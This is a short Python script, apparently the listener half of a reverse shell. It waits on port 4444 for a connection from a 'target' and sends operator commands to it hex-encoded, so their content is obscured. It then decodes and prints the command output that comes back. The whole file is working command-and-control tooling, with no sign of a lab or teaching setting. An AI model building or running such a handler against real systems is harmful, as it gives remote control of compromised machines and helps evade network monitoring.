import socket
import binascii

def hex_encode(data):
    return binascii.hexlify(data.encode()).decode()

def hex_decode(data):
    try:
        return binascii.unhexlify(data.encode()).decode(errors="ignore")
    except:
        return "[Decode Error]"

def start_listener(host='0.0.0.0', port=4444):
    print(f"[+] Listening on {host}:{port} ...")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        conn, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        try:
            while True:
                try:
                    cmd = input("CMD> ").strip()
                    if not cmd:
                        continue

                    # Try to send the command
                    conn.sendall(hex_encode(cmd).encode())

                    # Handle exit explicitly
                    if cmd.lower() == "exit":
                        print("[*] Exit command sent. Closing...")
                        break

                    print("[+] Output:")
                    conn.settimeout(2.0)
                    while True:
                        try:
                            data = conn.recv(4096)
                            if not data:
                                print("[!] Shell disconnected.")
                                return
                            decoded = hex_decode(data.decode())
                            print(decoded, end='')
                        except socket.timeout:
                            break

                except BrokenPipeError:
                    print("[!] Broken pipe — connection closed by target.")
                    break

        except KeyboardInterrupt:
            print("\n[!] Ctrl+C detected — exiting.")
        finally:
            conn.close()
            print("[+] Connection closed.")

if __name__ == "__main__":
    start_listener()
